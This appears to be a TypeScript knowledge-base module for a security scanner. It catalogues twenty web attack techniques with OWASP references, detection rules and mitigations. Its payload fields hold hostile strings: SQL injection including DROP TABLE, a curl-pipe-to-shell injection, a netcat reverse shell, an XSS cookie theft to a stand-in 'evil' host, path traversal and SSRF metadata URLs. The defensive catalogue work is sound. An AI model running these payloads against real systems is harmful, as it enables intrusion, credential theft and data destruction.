// CrackScope Part 23 — attack knowledge base.
// A curated library of offensive techniques, each with a CS-TXX identifier
// (MITRE ATT&CK-inspired), OWASP reference, detection rule mapping, and
// exploitation notes. Techniques map to live scan findings via `ruleIds`
// (same ruleId values the CrackScope engine emits) and via `category`.
import type { Severity } from "./scanner";

export interface Technique {
  id: string; // CS-T01 …
  name: string;
  /** MITRE ATT&CK-inspired tactic: which phase of the kill chain. */
  tactic: string;
  category: string; // matches finding.category values
  severity: Severity; // worst expected severity when it hits
  owasp: string; // OWASP Top 10 2021 reference
  ruleIds: string[]; // engine ruleIds that detect this technique
  summary: string;
  /** How the attack actually plays out against vulnerable code. */
  attackFlow: string[];
  /** Signature payload(s) used when exploiting. */
  payloads: string[];
  detection: string; // how CrackScope flags it
  mitigations: string[];
}

export const TECHNIQUES: Technique[] = [
  {
    id: "CS-T01",
    name: "SQL injection via string concatenation",
    tactic: "Initial Access",
    category: "injection",
    severity: "critical",
    owasp: "A03:2021 – Injection",
    ruleIds: ["SQLI-001", "SQLI-002", "ORM-001"],
    summary:
      "User-controlled input is concatenated into SQL, letting an attacker change query semantics to read, modify, or delete arbitrary rows.",
    attackFlow: [
      "Attacker identifies an endpoint passing request data into a SQL query string.",
      "Crafts input that closes the string literal and appends a new clause (e.g. ' OR 1=1 --).",
      "Escalates with UNION SELECT to exfiltrate other tables, or stacked queries to write.",
      "Database errors leak schema details, accelerating the exploit.",
    ],
    payloads: ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT email, password FROM users --"],
    detection:
      "Taint tracking marks the request-derived variable flowing into a database call with string concatenation (SQLI-* rules).",
    mitigations: [
      "Use parameterized queries / prepared statements exclusively.",
      "ORM raw-query escape hatches must accept bound parameters.",
      "Least-privilege database accounts so UNION/dump paths can't read other tables.",
    ],
  },
  {
    id: "CS-T02",
    name: "Command injection through shell wrappers",
    tactic: "Execution",
    category: "command-injection",
    severity: "critical",
    owasp: "A03:2021 – Injection",
    ruleIds: ["CMD-001", "CMD-002"],
    summary:
      "Input reaches exec/spawn/system calls, allowing arbitrary OS commands — often a full server compromise from a single parameter.",
    attackFlow: [
      "Attacker supplies shell metacharacters in a field used to build a command.",
      ";, &&, |, or $( ) chain a second command onto the intended one.",
      "Reverse shells or file drops follow; the process user's permissions bound the damage.",
    ],
    payloads: ["; cat /etc/passwd", "$(curl attacker.sh | sh)", "`id`", "| nc -e /bin/sh 10.0.0.1 4444"],
    detection:
      "Taint flow into exec/system/spawn sinks (CMD-*, EXEC-* rules), including Python os.system and subprocess with shell=True.",
    mitigations: [
      "Avoid shelling out; use native library calls instead.",
      "If unavoidable, validate against strict allowlists (e.g. ^[a-zA-Z0-9_-]+$).",
      "Run worker processes under a dedicated low-privilege user.",
    ],
  },
  {
    id: "CS-T03",
    name: "Cross-site scripting (reflected & stored)",
    tactic: "Initial Access",
    category: "xss",
    severity: "high",
    owasp: "A03:2021 – Injection",
    ruleIds: ["XSS-001", "XSS-002"],
    summary:
      "Unescaped user input is rendered into HTML or the DOM, executing attacker JavaScript in victims' browsers — session theft, keylogging, defacement.",
    attackFlow: [
      "Attacker submits a payload that survives storage or is echoed in a response.",
      "Victim loads the page; payload executes with the app's origin.",
      "document.cookie / token exfiltration; full account takeover via session replay.",
    ],
    payloads: ["<script>fetch('//evil/'+document.cookie)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
    detection:
      "Input rendered through innerHTML, document.write, dangerouslySetInnerHTML, or string-built HTML without escaping (XSS-* rules).",
    mitigations: [
      "Context-aware output encoding (HTML, attribute, JS, URL contexts differ).",
      "Sanitize rich text with a strict allowlist parser (DOMPurify).",
      "Content-Security-Policy as defense in depth; HttpOnly cookies blunt session theft.",
    ],
  },
  {
    id: "CS-T04",
    name: "Path traversal & arbitrary file read",
    tactic: "Collection",
    category: "path-traversal",
    severity: "high",
    owasp: "A01:2021 – Broken Access Control",
    ruleIds: ["PATH-001"],
    summary:
      "Filename input reaches fs read/write calls without normalization, letting ../ escape the intended directory and read secrets like /etc/passwd or .env.",
    attackFlow: [
      "Endpoint takes a filename/path parameter and opens it directly.",
      "Attacker sends ../../../../etc/passwd (or URL-encoded %2e%2e%2f variants).",
      "Reads application config and credentials, pivoting to deeper access.",
    ],
    payloads: ["../../etc/passwd", "..%2f..%2f.env", "....//....//config.yml"],
    detection:
      "User input concatenated or joined into fs.* calls without normalization checks (PATH-* rules).",
    mitigations: [
      "Resolve the final path and assert it is within the intended base directory.",
      "Reject raw user paths; use database IDs mapping to server-side filenames.",
      "Never expose filesystem layout through API parameters.",
    ],
  },
  {
    id: "CS-T05",
    name: "Server-side request forgery (SSRF)",
    tactic: "Discovery",
    category: "ssrf",
    severity: "high",
    owasp: "A10:2021 – SSRF",
    ruleIds: ["SSRF-001", "NET-003"],
    summary:
      "A URL parameter is fetched server-side, letting attackers reach internal services, cloud metadata endpoints (169.254.169.254), and loopback ports.",
    attackFlow: [
      "Feature accepts a URL (webhooks, URL previews, importers, PDF renderers).",
      "Attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/.",
      "Cloud IAM credentials come back in the response body — instance takeover follows.",
    ],
    payloads: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin", "file:///etc/passwd"],
    detection:
      "Request-derived URL flows into fetch/axios/http.get without host allowlisting (SSRF-* rules).",
    mitigations: [
      "Allowlist destination hosts/protocols; deny-link-local and loopback ranges.",
      "Resolve DNS then validate the IP before connecting (DNS-rebinding defense).",
      "Run egress via a proxy with metadata-service blocking.",
    ],
  },
  {
    id: "CS-T06",
    name: "Hardcoded secrets & credential exposure",
    tactic: "Credential Access",
    category: "secrets",
    severity: "critical",
    owasp: "A07:2021 – Identification and Authentication Failures",
    ruleIds: ["SECRET-AWS-AKID", "SECRET-AWS-SECRET", "SECRET-STRIPE", "SECRET-GITHUB", "SECRET-PRIVATEKEY", "SECRET-ENTROPY", "SEC-001"],
    summary:
      "API keys, tokens, and private keys committed to source. Anyone with repo access — or a leaked repo — gains production access immediately.",
    attackFlow: [
      "Developer pastes a live key into source for convenience.",
      "Secret scanners (or a repo leak) harvest it — automated bots find AWS keys within minutes.",
      "Attacker bills cloud resources or dumps the datastore under the stolen identity.",
    ],
    payloads: ["AKIA… (AWS access key id)", "sk_live_… (Stripe live key)", "-----BEGIN RSA PRIVATE KEY-----"],
    detection:
      "Entropy + provider-specific pattern scan (SECRET-* rules) across all submitted files.",
    mitigations: [
      "Move all secrets to environment/secret-manager storage.",
      "Pre-commit hooks + CI secret scanning to block commits.",
      "Rotate immediately on detection; rotation beats deletion.",
    ],
  },
  {
    id: "CS-T07",
    name: "Weak JWT signing & token forgery",
    tactic: "Privilege Escalation",
    category: "auth",
    severity: "high",
    owasp: "A07:2021 – Identification and Authentication Failures",
    ruleIds: ["AUTH-001", "JWT-002", "JWT-003", "JWT-004"],
    summary:
      "JWTs signed with weak/guessable secrets, the `none` algorithm, or verified without signature checks let attackers mint any identity, including admin.",
    attackFlow: [
      "Attacker decodes the token and inspects header/claims.",
      "With a weak secret they brute-force HS256; with `alg:none` they strip the signature entirely.",
      "Re-signed token with role:admin is accepted by the server.",
    ],
    payloads: ['{"alg":"none"}', "alg: HS256 with secret \"secret\"/\"123456\"", "empty-signature token"],
    detection:
      "jwt.sign/jwt.verify patterns with literal weak secrets, `none` algorithms, or missing verification options (JWT-* rules).",
    mitigations: [
      "Strong random secrets (≥256-bit) from configuration, never literals.",
      "Explicitly pin allowed algorithms in verify(); reject `none`.",
      "Short token lifetimes plus refresh-token rotation.",
    ],
  },
  {
    id: "CS-T08",
    name: "Broken object-level authorization (IDOR)",
    tactic: "Privilege Escalation",
    category: "access-control",
    severity: "high",
    owasp: "A01:2021 – Broken Access Control",
    ruleIds: ["AUTH-002", "NET-001", "PRIV-001", "PRIV-002"],
    summary:
      "Endpoints trust client-supplied object IDs without ownership checks — changing /invoices/1234 to /invoices/1235 reads someone else's data.",
    attackFlow: [
      "Attacker enumerates sequential IDs in API responses.",
      "Increments or guesses IDs of other tenants/users.",
      "Harvests data across the whole user base without authentication bypass.",
    ],
    payloads: ["/api/invoices/2 (as user 1)", "uuid substitution across tenants", "GET /api/users/42/profile"],
    detection:
      "Routes consuming params/id fields into DB lookups without an ownership filter (IDOR-*, AUTHZ-* rules).",
    mitigations: [
      "Scope every object query by the authenticated user/tenant id.",
      "Central authorization middleware — not per-handler ad-hoc checks.",
      "Use unguessable IDs (UUIDv4) as defense in depth, never as the only control.",
    ],
  },
  {
    id: "CS-T09",
    name: "Insecure deserialization (pickle & friends)",
    tactic: "Execution",
    category: "deserialization",
    severity: "critical",
    owasp: "A08:2021 – Software and Data Integrity Failures",
    ruleIds: ["DESER-001"],
    summary:
      "Untrusted bytes deserialized with pickle/unserialize/yaml.load execute embedded objects — a direct remote-code-execution primitive.",
    attackFlow: [
      "Attacker crafts a serialized payload whose reconstruction invokes arbitrary callables.",
      "Payload submitted wherever the app accepts serialized blobs (sessions, caches, uploads).",
      "load()/loads() reconstructs the object and runs attacker code with the app's privileges.",
    ],
    payloads: ["pickle RCE gadget chains", "!!python/object/apply:os.system [\"id\"]", "Java Commons-Collections gadget"],
    detection:
      "pickle.loads, yaml.load without SafeLoader, unserialize/eval-of-data patterns (PICKLE-*, DESERIALIZE-* rules).",
    mitigations: [
      "Never deserialize untrusted data with language-native object formats.",
      "Use json/protobuf with strict schemas; yaml.safe_load only.",
      "If legacy formats are unavoidable, add HMAC integrity over the blob and an allowlist of types.",
    ],
  },
  {
    id: "CS-T10",
    name: "Weak hashing & broken crypto primitives",
    tactic: "Credential Access",
    category: "crypto",
    severity: "high",
    owasp: "A02:2021 – Cryptographic Failures",
    ruleIds: ["CRYPTO-001", "CRYPTO-002", "CRYPTO-003", "CPBK-001", "CRAND-001", "CIV-001", "CIV-002", "CDES-001"],
    summary:
      "MD5/SHA-1 password hashing, ECB block mode, Math.random for tokens, and static IVs collapse the guarantees the crypto was meant to provide.",
    attackFlow: [
      "Password DB leaks; unsalted MD5 cracks at billions of guesses/second on commodity GPUs.",
      "ECB leaks plaintext structure — identical blocks produce identical ciphertext.",
      "Math.random-seeded tokens are brute-forced from a small seed space.",
    ],
    payloads: ["md5(password)", "AES-128-ECB", "Math.random().toString(36) as session token"],
    detection:
      "Algorithm-identifier matching for md5/sha1/ECB, Math.random in security contexts, hardcoded IVs (CRYPTO-* rules).",
    mitigations: [
      "Password hashing: argon2id or bcrypt with tuned cost factors.",
      "AES-GCM (or ChaCha20-Poly1305) with per-message random nonces.",
      "crypto.getRandomValues / crypto.randomBytes for all security randomness.",
    ],
  },
  {
    id: "CS-T11",
    name: "Vulnerable dependency exploitation",
    tactic: "Initial Access",
    category: "dependencies",
    severity: "high",
    owasp: "A06:2021 – Vulnerable and Outdated Components",
    ruleIds: ["DEP-001", "DEP-002", "DEP-003", "SUPPLY-001", "SUPPLY-002", "SUPPLY-003"],
    summary:
      "Known-vulnerable package versions (lodash prototype pollution, ejs RCE, axios SSRF…) ship to production; public exploits exist for most.",
    attackFlow: [
      "Dependency scan of the target reveals an outdated package with a CVE.",
      "Public exploit or PoC is adapted to the app's usage of the package.",
      "For example, lodash <4.17.19 merge() pollutes Object.prototype to flip auth flags.",
    ],
    payloads: ["lodash merge with __proto__ key", "ejs compile RCE via outputFunctionName", "axios SSRF via baseURL"],
    detection:
      "Lockfile/package.json version ranges checked against the known-CVE catalog (DEP-* rules), plus risky `*`/`latest` ranges.",
    mitigations: [
      "Pin exact versions; automate updates with audit gates in CI.",
      "Watch advisories for the packages you actually import.",
      "Remove transitive usage of vulnerable packages via overrides/resolutions.",
    ],
  },
  {
    id: "CS-T12",
    name: "Prototype pollution to auth bypass",
    tactic: "Privilege Escalation",
    category: "prototype-pollution",
    severity: "high",
    owasp: "A03:2021 – Injection",
    ruleIds: ["PROTO-001"],
    summary:
      "Deep-merge/recursive-extend helpers that trust client JSON let __proto__ payloads rewrite Object.prototype — flipping default-role and other security flags globally.",
    attackFlow: [
      "Attacker POSTs {\"__proto__\": {\"admin\": true}} to a merge-based config endpoint.",
      "Every object in the process now inherits admin:true as a default.",
      "Downstream `if (user.admin)`-style checks pass without any role grant.",
    ],
    payloads: ['{"__proto__":{"admin":true}}', '{"constructor":{"prototype":{"isAdmin":1}}}'],
    detection:
      "Deep-merge helpers consuming request bodies without __proto__/constructor-key guards (PROTO-*, DEEP-MERGE-* rules).",
    mitigations: [
      "Block __proto__, constructor, and prototype keys in all merge paths.",
      "Use Map instead of plain objects for attacker-influenced key/value stores.",
      "Node ≥12 hardened JSON.parse — still insufficient for custom merge code; validate keys.",
    ],
  },
  {
    id: "CS-T13",
    name: "Open redirect chain abuse",
    tactic: "Initial Access",
    category: "open-redirect",
    severity: "medium",
    owasp: "A01:2021 – Broken Access Control",
    ruleIds: ["REDIR-001", "NET-004"],
    summary:
      "Redirect targets taken from request data turn your trusted domain into a phishing launchpad — and often leak OAuth codes along the way.",
    attackFlow: [
      "Login/cancel URLs carry ?next=… straight into res.redirect().",
      "Attacker crafts https://app.com/login?next=https://evil.example/clone.",
      "Victims see the trusted domain in the link; the clone page harvests credentials.",
    ],
    payloads: ["?next=https://evil.example", "?next=//evil.example (protocol-relative)", "?next=https:evil.com"],
    detection:
      "Redirect calls (redirect/sendRedirect/location) consuming request-derived values without origin validation (REDIRECT-*, OPEN-REDIRECT rules).",
    mitigations: [
      "Allowlist redirect destinations; default to a fixed route.",
      "Reject protocol-relative and scheme-injected URLs.",
      "For OAuth flows, exact-match registered redirect_uri values.",
    ],
  },
  {
    id: "CS-T14",
    name: "Misconfigured CORS & cross-origin data theft",
    tactic: "Collection",
    category: "cors",
    severity: "medium",
    owasp: "A05:2021 – Security Misconfiguration",
    ruleIds: ["CONFIG-001", "NET-002"],
    summary:
      "Wildcard or origin-reflecting CORS with credentials=true lets any origin read authenticated responses cross-origin.",
    attackFlow: [
      "Attacker hosts a page that fetches the victim API with credentials: 'include'.",
      "Server reflects the evil origin and echoes Access-Control-Allow-Credentials.",
      "Browser delivers the victim's data straight to the attacker's JavaScript.",
    ],
    payloads: ["Access-Control-Allow-Origin: *  +  credentials: true", "origin-echo middleware without allowlist"],
    detection:
      "CORS configuration patterns — wildcard origins, reflection, or wildcard+credentials combos (CORS-* rules).",
    mitigations: [
      "Explicit origin allowlist, no reflection of arbitrary headers.",
      "Never combine `credentials: true` with wildcard origins.",
      "Restrict sensitive endpoints by method and header in the same policy.",
    ],
  },
  {
    id: "CS-T15",
    name: "CI/CD pipeline poisoning",
    tactic: "Persistence",
    category: "cicd",
    severity: "critical",
    owasp: "A08:2021 – Software and Data Integrity Failures",
    ruleIds: ["CI-001", "CI-002", "CI-003", "CI-004", "CI-005", "CI-006", "CI-007", "CI-008", "IAC-001", "IAC-002", "IAC-003"],
    summary:
      "Pipelines that curl|bash from untrusted sources, interpolate PR-controlled values into shell, or log secrets give attackers persistent code execution in your build and deploy chain.",
    attackFlow: [
      "Attacker opens a PR with a malicious branch name or title.",
      "Workflow interpolates it unquoted into run: shell — command injection in CI.",
      "Pipeline secrets (cloud keys) exfiltrate; a backdoored artifact ships to production.",
    ],
    payloads: ['run: curl ${{ github.event.pull_request.title }} | sh', "docker run as root with mounted docker.sock", "0.0.0.0/0 ingress in Terraform"],
    detection:
      "Static scan of workflow/Dockerfile/IaC files — unquoted interpolation, curl-pipe-shell, root users, open security groups (CICD-*, DOCKER-*, IAC-* rules).",
    mitigations: [
      "Quote every interpolated expression in run: blocks; validate PR titles/branches.",
      "Pin actions to full-length SHAs; use least-privilege workflow tokens.",
      "Non-root container users; Terraform/Cloudflare policy checks for 0.0.0.0/0.",
    ],
  },
  {
    id: "CS-T16",
    name: "NoSQL & LDAP injection",
    tactic: "Initial Access",
    category: "injection",
    severity: "high",
    owasp: "A03:2021 – Injection",
    ruleIds: ["NOSQL-001", "ORM-002", "LDAP-001", "LDAP-002", "SSTI-001", "SSTI-002"],
    summary:
      "Document stores and directory services accept operator dicts or filter strings built from input — $gt empty-object logins and LDAP filter bypasses follow.",
    attackFlow: [
      "Login handler passes req.body straight into db.find().",
      "Attacker sends {\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}} — matches the first user unconditionally.",
      "Template injection variants escalate to full RCE (SSTI → Jinja/EJS/Velocity).",
    ],
    payloads: ['{"$gt":""}', '{"$ne":null}', "*)(uid=*))(|(uid=*", "${7*7} → 49 (SSTI probe)"],
    detection:
      "Query calls consuming whole request objects or concatenated filter strings (NOSQL-*, LDAP-*, TEMPLATE-* rules).",
    mitigations: [
      "Sanitize input types: expect strings, reject objects for credential fields.",
      "Build LDAP filters with escaping libraries; never concatenate.",
      "Sandbox template engines; never render user input as template source.",
    ],
  },
  {
    id: "CS-T17",
    name: "Insecure cookie & session handling",
    tactic: "Credential Access",
    category: "session",
    severity: "medium",
    owasp: "A07:2021 – Identification and Authentication Failures",
    ruleIds: ["SESS-001", "SESS-002", "SESS-003"],
    summary:
      "Cookies without HttpOnly/Secure/SameSite flags, predictable session ids, and fixation-prone login flows hand sessions to network attackers and subdomains.",
    attackFlow: [
      "XSS (even a minor one) reads a non-HttpOnly session cookie.",
      "Or a subdomain sets a cookie that overwrites the app's session (fixation).",
      "Attacker replays the stolen/fixed session id as the victim.",
    ],
    payloads: ["document.cookie in an XSS context", "Set-Cookie without Secure over WiFi", "pre-auth session id reuse"],
    detection:
      "Set-Cookie flag inspection and session-lifecycle patterns (COOKIE-*, SESSION-* rules).",
    mitigations: [
      "Set HttpOnly, Secure, SameSite=Strict (or Lax deliberately) on all auth cookies.",
      "Regenerate session ids on privilege change (login especially).",
      "Server-side session store with revocation on logout.",
    ],
  },
  {
    id: "CS-T18",
    name: "Sensitive data & error leakage",
    tactic: "Collection",
    category: "info-disclosure",
    severity: "medium",
    owasp: "A09:2021 – Security Logging and Monitoring Failures",
    ruleIds: ["CONFIG-002", "CWE-532"],
    summary:
      "Stack traces, debug flags, verbose logs, and exposed config endpoints reveal internals — file paths, dependency versions, query shapes — accelerating every other technique.",
    attackFlow: [
      "Attacker triggers an error (malformed input) and receives a full stack trace.",
      "Framework versions and file paths from the trace map directly to public CVEs.",
      "Debug/actuator endpoints leak env vars and live config.",
    ],
    payloads: ["%00 and malformed JSON to trigger traces", "GET /debug /actuator/env /config.json"],
    detection:
      "Error handlers that res.send(err), app.debug flags, console.log of secrets (ERR-*, DEBUG-*, PII-*, CONFIG-* rules).",
    mitigations: [
      "Generic error responses client-side; full details server-side logs only.",
      "Disable debug/actuator endpoints in production builds.",
      "Structured logging with secret redaction middleware.",
    ],
  },
  {
    id: "CS-T19",
    name: "Mass assignment & unsafe property copying",
    tactic: "Privilege Escalation",
    category: "access-control",
    severity: "high",
    owasp: "A04:2021 – Insecure Design",
    ruleIds: ["NOSQL-001", "ORM-002", "AUTH-002"],
    summary:
      "Request bodies saved straight into the datastore let attackers set fields the API never intended — role, is_admin, price — by simply including them.",
    attackFlow: [
      "Registration endpoint does User.create(req.body).",
      "Attacker adds \"role\":\"admin\" to the JSON.",
      "Account is created with admin privileges — no exploit chain needed.",
    ],
    payloads: ['{"email":"a@b.c","password":"x","role":"admin"}', '{"is_superuser":true}', '{"price":1}'],
    detection:
      "ORM create/update calls consuming req.body without a field allowlist (MASS-ASSIGNMENT, REQ-BODY-* rules).",
    mitigations: [
      "Explicit field allowlists (or strict DTO schemas) on every write endpoint.",
      "Never bind request objects directly to ORM models.",
      "Field-level authorization for privileged attributes.",
    ],
  },
  {
    id: "CS-T20",
    name: "Denial of service via regex & parser abuse",
    tactic: "Impact",
    category: "dos",
    severity: "medium",
    owasp: "A05:2021 – Security Misconfiguration",
    ruleIds: ["FUZZ-001", "FUZZ-003", "FUZZ-004", "FUZZ-006"],
    summary:
      "Catastrophic backtracking regexes and unbounded request bodies let a single crafted request pin a CPU core or exhaust memory — cheap, repeated, and hard to attribute.",
    attackFlow: [
      "Attacker locates a user-influenced regex (validation, search, routing).",
      "Crafts input hitting exponential backtracking — a 30-char string can hang for hours.",
      "Repeats across instances until the service is effectively offline.",
    ],
    payloads: ["(a+)+$ against aaaaa…b", "100MB JSON body to a parser without limits", "nested YAML anchors (billion laughs)"],
    detection:
      "Regex literals with nested quantifiers over user input, missing body-parser limits (REDOC-*, REGEX-*, BODY-* rules).",
    mitigations: [
      "Bound input length before regex evaluation; use linear-time engines (RE2).",
      "Set body size limits on every parser (json, urlencoded, multipart).",
      "Rate-limit expensive endpoints; timeouts on request processing.",
    ],
  },
];

export const TACTICS = Array.from(new Set(TECHNIQUES.map((t) => t.tactic)));

// ---------- Live-finding mapping ----------

export interface FindingLike {
  ruleId: string;
  category: string;
  title: string;
  severity: Severity;
}

const RULE_INDEX = new Map<string, Technique>();
for (const t of TECHNIQUES) {
  for (const r of t.ruleIds) RULE_INDEX.set(r, t);
}

/** Map a live finding to its knowledge-base technique, if one exists. */
export function techniqueForFinding(finding: FindingLike): Technique | null {
  return RULE_INDEX.get(finding.ruleId) ?? null;
}

const SEVERITY_ORDER: Severity[] = ["critical", "high", "medium", "low", "info"];

/** Aggregate live findings per technique for coverage panels. */
export function techniqueCoverage(findings: FindingLike[]): Map<string, { technique: Technique; count: number }> {
  const map = new Map<string, { technique: Technique; count: number }>();
  for (const f of findings) {
    const t = techniqueForFinding(f);
    if (!t) continue;
    const entry = map.get(t.id);
    if (entry) entry.count += 1;
    else map.set(t.id, { technique: t, count: 1 });
  }
  return map;
}

export function severityRank(s: Severity): number {
  return SEVERITY_ORDER.indexOf(s);
}

// ---------- Search ----------

export function searchTechniques(query: string, tacticFilter: string | null): Technique[] {
  const q = query.trim().toLowerCase();
  return TECHNIQUES.filter((t) => {
    if (tacticFilter && t.tactic !== tacticFilter) return false;
    if (!q) return true;
    const haystack = [
      t.id,
      t.name,
      t.tactic,
      t.category,
      t.owasp,
      t.summary,
      ...t.ruleIds,
      ...t.payloads,
      ...t.mitigations,
    ]
      .join(" ")
      .toLowerCase();
    return haystack.includes(q);
  });
}
